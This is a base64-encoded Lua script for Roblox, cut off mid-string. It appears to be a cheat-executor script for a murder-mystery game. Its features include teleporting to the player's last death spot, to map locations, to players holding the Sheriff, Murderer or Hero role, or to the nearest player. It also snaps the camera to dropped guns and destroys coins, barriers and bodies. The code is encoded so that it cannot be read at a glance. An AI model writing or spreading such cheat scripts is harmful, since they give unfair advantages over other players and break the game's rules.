d29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHgpCiAgICAgICAgICAgICAgICBpZiB4Lk5hbWU9PSJHdW5Ecm9wIiBhbmQgeDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSB4CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBsb2NhbCBleCA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR3VuRHJvcCIsIHRydWUpCiAgICAgICAgICAgIGlmIGV4IHRoZW4gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGV4IGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmdldGdlbnYoKS5wID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCgpsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCmd1aS5OYW1lID0gIlRlbGVwb3J0R3VpIgpndWkuUmVzZXRPblNwYXduID0gZmFsc2UKZ3VpLlBhcmVudCA9IHA6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQoKbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKYnRuLk5hbWUgPSAiVGVsZXBvcnRCdXR0b24iCmJ0bi5TaXplID0gVURpbTIubmV3KDAsIDUwLCAwLCA1MCkKYnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0yMjAgLSA1MCAtIDEwIC0gNTAgLSAxMCwgMCwgMTApCmJ0bi5UZXh0ID0gIlRlbGVwb3J0IHRvIFxuIExhc3QgRGVhdGgiCmJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbQpidG4uVGV4dFNpemUgPSAxMApidG4uVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQpidG4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNgpidG4uRHJhZ2dhYmxlID0gdHJ1ZQpidG4uUGFyZW50ID0gZ3VpCmxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKY29ybmVyLlBhcmVudCA9IGJ0bgoKbG9jYWwgYm9yZGVyRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKYm9yZGVyRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQpib3JkZXJGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQpib3JkZXJGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpib3JkZXJGcmFtZS5aSW5kZXggPSBidG4uWkluZGV4ICsgMQpib3JkZXJGcmFtZS5QYXJlbnQgPSBidG4KCmxvY2FsIGJvcmRlclN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpib3JkZXJTdHJva2UuVGhpY2tuZXNzID0gMgpib3JkZXJTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKQpib3JkZXJTdHJva2UuUGFyZW50ID0gYm9yZGVyRnJhbWUKCmxvY2FsIGZyYW1lQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmZyYW1lQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQpmcmFtZUNvcm5lci5QYXJlbnQgPSBib3JkZXJGcmFtZQoKZ2V0Z2VudigpLmxhc3RQb3MgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcubGFzdFBvcyBvciBuaWwKZ2V0Z2VudigpLnRvZ2dsZU9uID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnRwQXRMYXN0RGVhdGggb3IgZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIHJlY29yZFBvcygpCiAgICBpZiBwLkNoYXJhY3RlciBhbmQgcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgZ2V0Z2VudigpLmxhc3RQb3MgPSBwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5sYXN0UG9zID0gZ2V0Z2VudigpLmxhc3RQb3MKICAgICAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBvbkRlYXRoKCkKICAgIHJlY29yZFBvcygpCmVuZAoKbG9jYWwgZnVuY3Rpb24gb25BZGQoYykKICAgIGxvY2FsIGh1bSA9IGM6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIsIDMpCiAgICBpZiBodW0gdGhlbgogICAgICAgIGh1bS5EaWVkOkNvbm5lY3Qob25EZWF0aCkKICAgIGVuZAplbmQKCnAuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChvbkFkZCkKaWYgcC5DaGFyYWN0ZXIgdGhlbgogICAgb25BZGQocC5DaGFyYWN0ZXIpCmVuZAoKTGlicmFyeS5hZGRUb2dnbGUodGFiNCwgInRwIGF0IHRoZSBMYXN0IERlYXRoIiwgInRlbGV0cmFuc3BvcnRhcnNlIGEgbGEgw7psdGltYSBwb3NpY2nDs24gZGUgbGEgbXVlcnRlIiwgZ2V0Z2VudigpLnRvZ2dsZU9uLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS50b2dnbGVPbiA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcudHBBdExhc3REZWF0aCA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBidG4uVmlzaWJsZSA9IHN0YXRlCmVuZCkKCmJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIG5vdCBnZXRnZW52KCkudG9nZ2xlT24gdGhlbiByZXR1cm4gZW5kCiAgICBpZiBub3QgZ2V0Z2VudigpLmxhc3RQb3MgdGhlbgogICAgICAgIGJ0bi5UZXh0ID0gIk5vIGRlYXRoIHBvc2l0aW9uISIKICAgICAgICB0YXNrLndhaXQoMikKICAgICAgICBidG4uVGV4dCA9ICJUZWxlcG9ydCB0byBcbiBMYXN0IERlYXRoIgogICAgICAgIHJldHVybgogICAgZW5kCiAgICBpZiBwLkNoYXJhY3RlciBhbmQgcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgcC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBnZXRnZW52KCkubGFzdFBvcwogICAgZWxzZQogICAgICAgIGJ0bi5UZXh0ID0gIk5vIGNoYXJhY3RlciBmb3VuZCEiCiAgICAgICAgdGFzay53YWl0KDIpCiAgICAgICAgYnRuLlRleHQgPSAiVGVsZXBvcnQgdG8gXG4gTGFzdCBEZWF0aCIKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZExhYmVsKHRhYjQsICJUZWxlcG9ydCBUbyBBIFNwZWNpZmljIExvY2F0aW9uIikKCkxpYnJhcnkuYWRkRHJvcGRvd24odGFiNCwgIkdvIHRvIiwgIkxvYmJ5IiwgeyJMb2JieSIsICJWb3RlIE1hcCIsICJHbyB0byBNYXAiLCAiVm9pZCAoU2FmZSkifSwgZnVuY3Rpb24oc2VsZWN0ZWRPcHRpb24pCiAgICBpZiBzZWxlY3RlZE9wdGlvbiA9PSAiTG9iYnkiIHRoZW4KICAgICAgICBsb2NhbCBocnAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCBzcGF3bnMgPSB3b3Jrc3BhY2UuTG9iYnkuU3Bhd25zOkdldENoaWxkcmVuKCkKCiAgICAgICAgaWYgaHJwIGFuZCAjc3Bhd25zID4gMCB0aGVuCiAgICAgICAgICAgIGhycC5DRnJhbWUgPSBzcGF3bnNbbWF0aC5yYW5kb20oI3NwYXducyldLkNGcmFtZSArIFZlY3RvcjMubmV3KDAsIDMsIDApCiAgICAgICAgZW5kCiAgICBlbHNlaWYgc2VsZWN0ZWRPcHRpb24gPT0gIlZvdGUgTWFwIiB0aGVuCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTEwOSwgMTQxLCA4OCkKICAgIGVsc2VpZiBzZWxlY3RlZE9wdGlvbiA9PSAiR28gdG8gTWFwIiB0aGVuCiAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIlNwYXduIiBvciB2Lk5hbWUgPT0gIlBsYXllclNwYXduIiB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyh2LlBvc2l0aW9uKSAqIENGcmFtZS5uZXcoMCwgMi41LCAwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVsc2VpZiBzZWxlY3RlZE9wdGlvbiA9PSAiVm9pZCAoU2FmZSkiIHRoZW4KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBocnAgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCiAgICAgICAgbG9jYWwgdGVsZXBvcnRQb3NpdGlvbiA9IENGcmFtZS5uZXcoLTc0LCA2LCA2OTMpCiAgICAgICAgaHJwLkNGcmFtZSA9IHRlbGVwb3J0UG9zaXRpb24gKiBDRnJhbWUubmV3KDAsIDMsIDApCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWI0LCAidGVsZXBvcnQgYSByb2xlIHBsYXllciIpCgpMaWJyYXJ5LmFkZERyb3Bkb3duKHRhYjQsICJUZWxlcG9ydCB0byIsICJyb2xlIiwgeyJTaGVyaWZmIiwgIk11cmRlcmVyIiwgIkhlcm8ifSwgZnVuY3Rpb24oc2VsZWN0ZWRSb2xlKQogICAgVGVsZXBvcnRUb1JvbGUoc2VsZWN0ZWRSb2xlKQplbmQpCgpsb2NhbCBscCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgZnVuY3Rpb24gZ2V0Q2xvc2VzdFBsYXllcigpCiAgICBsb2NhbCBjbG9zZXN0LCBkaXN0YW5jZSA9IG5pbCwgbWF0aC5odWdlCiAgICBsb2NhbCBscFJvb3QgPSBscC5DaGFyYWN0ZXIgYW5kIGxwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBub3QgbHBSb290IHRoZW4gcmV0dXJuIG5pbCBlbmQKCiAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHBsYXllciB+PSBscCBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgaWYgcm9vdCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBkID0gKGxwUm9vdC5Qb3NpdGlvbiAtIHJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgaWYgZCA8IGRpc3RhbmNlIHRoZW4gY2xvc2VzdCwgZGlzdGFuY2UgPSBwbGF5ZXIsIGQgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gY2xvc2VzdAplbmQKCmxvY2FsIGZ1bmN0aW9uIGdldFJhbmRvbVBsYXllcigpCiAgICBsb2NhbCBwbGF5ZXJzID0ge30KICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxheWVyIH49IGxwIHRoZW4gdGFibGUuaW5zZXJ0KHBsYXllcnMsIHBsYXllcikgZW5kCiAgICBlbmQKICAgIHJldHVybiAjcGxheWVycyA+IDAgYW5kIHBsYXllcnNbbWF0aC5yYW5kb20oMSwgI3BsYXllcnMpXSBvciBuaWwKZW5kCgpsb2NhbCBmdW5jdGlvbiB0ZWxlcG9ydFRvKG9wdGlvbikKICAgIGxvY2FsIHRhcmdldCA9IG9wdGlvbiA9PSAiUmFuZG9tIFBsYXllciIgYW5kIGdldFJhbmRvbVBsYXllcigpIG9yIGdldENsb3Nlc3RQbGF5ZXIoKQogICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQuQ2hhcmFjdGVyIHRoZW4KICAgICAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgbHBSb290ID0gbHAuQ2hhcmFjdGVyIGFuZCBscC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGlmIHRhcmdldFJvb3QgYW5kIGxwUm9vdCB0aGVuIGxwUm9vdC5DRnJhbWUgPSB0YXJnZXRSb290LkNGcmFtZSBlbmQKICAgIGVuZAplbmQKCkxpYnJhcnkuYWRkRHJvcGRvd24odGFiNCwgIlRlbGVwb3J0IHRvIiwgInBsYXllcnMiLCB7IlJhbmRvbSBQbGF5ZXIiLCAiQ2xvc2VzdCBQbGF5ZXIifSwgZnVuY3Rpb24ob3B0aW9uKSB0ZWxlcG9ydFRvKG9wdGlvbikgZW5kKQpMaWJyYXJ5LmFkZExhYmVsKHRhYjQsICJUZWxlcG9ydCIpCkxpYnJhcnkuYWRkTGFiZWwodGFiMTAsICJPcHRpbWl6YXRpb24gKG1heWJlIG1vcmUgbGFnIHRoYW4gbm9ybWFsKSIpCgpnZXRnZW52KCkuYW50aUxhZyA9IGZhbHNlCmdldGdlbnYoKS5yZW1vdmVSYWdneSA9IGZhbHNlCmdldGdlbnYoKS5kZXN0cm95Q29pbnMgPSBmYWxzZQpnZXRnZW52KCkucmVtb3ZlQmFycmllciA9IGZhbHNlCmdldGdlbnYoKS50YXJnZXRNb2RlbHMgPSB7IlJhZ2d5IiwgIkdsaXRjaFByb29mIn0KCmxvY2FsIG9wdCA9IHsKICAgIGNvaW5Db25uZWN0aW9ucyA9IHt9LAogICAgY29pbkNvbnRhaW5lckNvbm5lY3Rpb24gPSBuaWwKfQoKZnVuY3Rpb24gb3B0LmRlc3Ryb3lUYXJnZXRNb2RlbHMoKQogICAgZm9yIF8sIG9iaiBpbiBpcGFpcnMoV29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgaWYgb2JqOklzQSgiTW9kZWwiKSBhbmQgdGFibGUuZmluZChnZXRnZW52KCkudGFyZ2V0TW9kZWxzLCBvYmouTmFtZSkgdGhlbgogICAgICAgICAgICBvYmo6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpmdW5jdGlvbiBvcHQuZ2V0Q29pbkNvbnRhaW5lcigpCiAgICByZXR1cm4gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJDb2luQ29udGFpbmVyIiwgdHJ1ZSkKZW5kCgpmdW5jdGlvbiBvcHQuYXR0YWNoQ29pbkxpc3RlbmVyKGNvaW4pCiAgICBpZiBvcHQuY29pbkNvbm5lY3Rpb25zW2NvaW5dIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgY29ubiA9IGNvaW4uVG91Y2hlZDpDb25uZWN0KGZ1bmN0aW9uKGhpdCkKICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmRlc3Ryb3lDb2lucyB0aGVuIHJldHVybiBlbmQKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBoaXQuUGFyZW50CiAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCBQbGF5ZXJzOkdldFBsYXllckZyb21DaGFyYWN0ZXIoY2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgIGlmIGNvbm4uQ29ubmVjdGVkIHRoZW4gY29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgIG9wdC5jb2luQ29ubmVjdGlvbnNbY29pbl0gPSBuaWwKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgaWYgY29pbiBhbmQgY29pbi5QYXJlbnQgdGhlbiBjb2luOkRlc3Ryb3koKSBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIG9wdC5jb2luQ29ubmVjdGlvbnNbY29pbl0gPSBjb25uCmVuZAoKZnVuY3Rpb24gb3B0LmRldGFjaEFsbENvaW5MaXN0ZW5lcnMoKQogICAgZm9yIGNvaW4sIGNvbm4gaW4gcGFpcnMob3B0LmNvaW5Db25uZWN0aW9ucykgZG8KICAgICAgICBpZiBjb25uLkNvbm5lY3RlZCB0aGVuIGNvbm46RGlzY29ubmVjdCgpIGVuZAogICAgZW5kCiAgICBvcHQuY29pbkNvbm5lY3Rpb25zID0ge30KICAgIGlmIG9wdC5jb2luQ29udGFpbmVyQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgb3B0LmNvaW5Db250YWluZXJDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgIG9wdC5jb2luQ29udGFpbmVyQ29ubmVjdGlvbiA9IG5pbAogICAgZW5kCmVuZAoKZnVuY3Rpb24gb3B0Lm1vbml0b3JDb2lucygpCiAgICBsb2NhbCBjb250YWluZXIgPSBvcHQuZ2V0Q29pbkNvbnRhaW5lcigpCiAgICBpZiBjb250YWluZXIgdGhlbgogICAgICAgIGZvciBfLCBjb2luIGluIGlwYWlycyhjb250YWluZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgY29pbi5OYW1lID09ICJDb2luX1NlcnZlciIgYW5kIGNvaW46SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIG9wdC5hdHRhY2hDb2luTGlzdGVuZXIoY29pbikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgb3B0LmNvaW5Db250YWluZXJDb25uZWN0aW9uID0gY29udGFpbmVyLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICAgICAgaWYgY2hpbGQuTmFtZSA9PSAiQ29pbl9TZXJ2ZXIiIGFuZCBjaGlsZDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgb3B0LmF0dGFjaENvaW5MaXN0ZW5lcihjaGlsZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZAoKZnVuY3Rpb24gb3B0LmNsZWFyTGFnKCkKICAgIGZvciBfLCBmb2xkZXIgaW4gaXBhaXJzKFdvcmtzcGFjZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIGFuZCB0YWJsZS5maW5kKHsiRm9vdHN0ZXBzIiwgIldlYXBvbkRpc3BsYXlzIn0sIGZvbGRlci5OYW1lKSB0aGVuCiAgICAgICAgICAgIGZvbGRlcjpEZXN0cm95KCkKICAgICAgICBlbmQKICAgIGVuZAogICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGZvciBfLCBpdGVtIGluIGlwYWlycyh7IktuaWZlRGlzcGxheSIsICJHdW5EaXNwbGF5IiwgIlBldCJ9KSBkbwogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SXRlbSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChpdGVtKQogICAgICAgICAgICAgICAgaWYgdGFyZ2V0SXRlbSB0aGVuIHRhcmdldEl0ZW06RGVzdHJveSgpIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2hyb21hID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikgYW5kIHRvb2wuSGFuZGxlOkZpbmRGaXJzdENoaWxkKCJDaHJvbWEiKQogICAgICAgICAgICAgICAgICAgIGlmIGNocm9tYSB0aGVuIGNocm9tYTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGZvciBfLCBjaGlsZCBpbiBpcGFpcnMoV29ya3NwYWNlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgY2hpbGQ6SXNBKCJNb2RlbCIpIG9yIGNoaWxkOklzQSgiUGFydCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgY2hyb21hID0gY2hpbGQ6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpIGFuZCBjaGlsZC5IYW5kbGU6RmluZEZpcnN0Q2hpbGQoIkNocm9tYSIpCiAgICAgICAgICAgIGlmIGNocm9tYSB0aGVuIGNocm9tYTpEZXN0cm95KCkgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpmdW5jdGlvbiBvcHQubW9uaXRvckFudGlMYWcoKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIGdldGdlbnYoKS5hbnRpTGFnIHRoZW4gb3B0LmNsZWFyTGFnKCkgZW5kCiAgICAgICAgdGFzay53YWl0KDEpCiAgICBlbmQKZW5kCgp0YXNrLnNwYXduKG9wdC5tb25pdG9yQW50aUxhZykKCldvcmtzcGFjZS5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICBpZiBnZXRnZW52KCkuYW50aUxhZyB0aGVuCiAgICAgICAgaWYgY2hpbGQ6SXNBKCJGb2xkZXIiKSBhbmQgdGFibGUuZmluZCh7IkZvb3RzdGVwcyIsICJXZWFwb25EaXNwbGF5cyJ9LCBjaGlsZC5OYW1lKSB0aGVuCiAgICAgICAgICAgIGNoaWxkOkRlc3Ryb3koKQogICAgICAgIGVsc2VpZiBjaGlsZDpJc0EoIk1vZGVsIikgb3IgY2hpbGQ6SXNBKCJQYXJ0IikgdGhlbgogICAgICAgICAgICBsb2NhbCBjaHJvbWEgPSBjaGlsZDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikgYW5kIGNoaWxkLkhhbmRsZTpGaW5kRmlyc3RDaGlsZCgiQ2hyb21hIikKICAgICAgICAgICAgaWYgY2hyb21hIHRoZW4gY2hyb21hOkRlc3Ryb3koKSBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgaWYgZ2V0Z2VudigpLnJlbW92ZUJhcnJpZXIgYW5kIGNoaWxkOklzQSgiTW9kZWwiKSBhbmQgY2hpbGQuTmFtZSA9PSAiR2xpdGNoUHJvb2YiIHRoZW4KICAgICAgICBjaGlsZDpEZXN0cm95KCkKICAgIGVuZAplbmQpCgpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24obmV3UGxheWVyKQogICAgbmV3UGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcmFjdGVyKQogICAgICAgIGlmIGdldGdlbnYoKS5hbnRpTGFnIHRoZW4gb3B0LmNsZWFyTGFnKCkgZW5kCiAgICBlbmQpCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEwLCAib3B0aW1pemF0aW9uIiwgIm9wdGltaXphY2nDs24iLCBmYWxzZSwgZnVuY3Rpb24oc3RhdGUpCiAgICBnZXRnZW52KCkuYW50aUxhZyA9IHN0YXRlCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEwLCAiRGVzdHJveSBkZWFkIGJvZHkiLCAiZGVzdHJ1aXIgY2Fkw6F2ZXJlcyIsIGZhbHNlLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5yZW1vdmVSYWdneSA9IHN0YXRlCiAgICBpZiBzdGF0ZSB0aGVuIG9wdC5kZXN0cm95VGFyZ2V0TW9kZWxzKCkgZW5kCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEwLCAiRGVzdHJveSBjb2lucyIsICJkZXN0cnVpciBtb25lZGFzIiwgZmFsc2UsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLmRlc3Ryb3lDb2lucyA9IHN0YXRlCiAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgb3B0Lm1vbml0b3JDb2lucygpCiAgICBlbHNlCiAgICAgICAgb3B0LmRldGFjaEFsbENvaW5MaXN0ZW5lcnMoKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEwLCAiUmVtb3ZlIEJhcnJpZXIiLCAicmVtb3ZlciBiYXJyZXJhIiwgZmFsc2UsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLnJlbW92ZUJhcnJpZXIgPSBzdGF0ZQogICAgaWYgc3RhdGUgdGhlbiBvcHQuZGVzdHJveVRhcmdldE1vZGVscygpIGVuZAplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIxMCwgIlJlbW92ZSBzaGFkb3ciLCAicmVtb3ZlciBzb21icmFzIiwgZmFsc2UsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2FtZS5MaWdodGluZy5HbG9iYWxTaGFkb3dzID0gbm90IHN0YXRlCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEwLCAiUmVtb3ZlIHBsYXllcnMgQWNjZXNzb3J5IiwgInJlbW92ZXIganVnYWRvcmVzIEFjY2Vzb3JpbyIsIGZhbHNlLCBmdW5jdGlvbihzdGF0ZSkKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBmb3IgXywgcGxheWVyIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxheWVyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIGlmIHBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBhY2Nlc3NvcnkgaW4gcGFpcnMocGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBhY2Nlc3Nvcnk6SXNBKCJBY2Nlc3NvcnkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY2Nlc3Nvcnk6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGxpZ2h0aW5nID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCmxvY2FsIGFmZmVjdGVkT2JqZWN0cyA9IHt9CgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIxMCwgIkxlc3MgbGFnIG9wdGltaXphdGlvbiIsICJtZW5vcyBsYWciLCBmYWxzZSwgZnVuY3Rpb24oc3RhdGUpCiAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgbGlnaHRpbmcuR2xvYmFsU2hhZG93cyA9IGZhbHNlCiAgICAgICAgbGlnaHRpbmcuRm9nRW5kID0gOWU5CiAgICAgICAgCiAgICAgICAgZm9yIF8sIHYgaW4gcG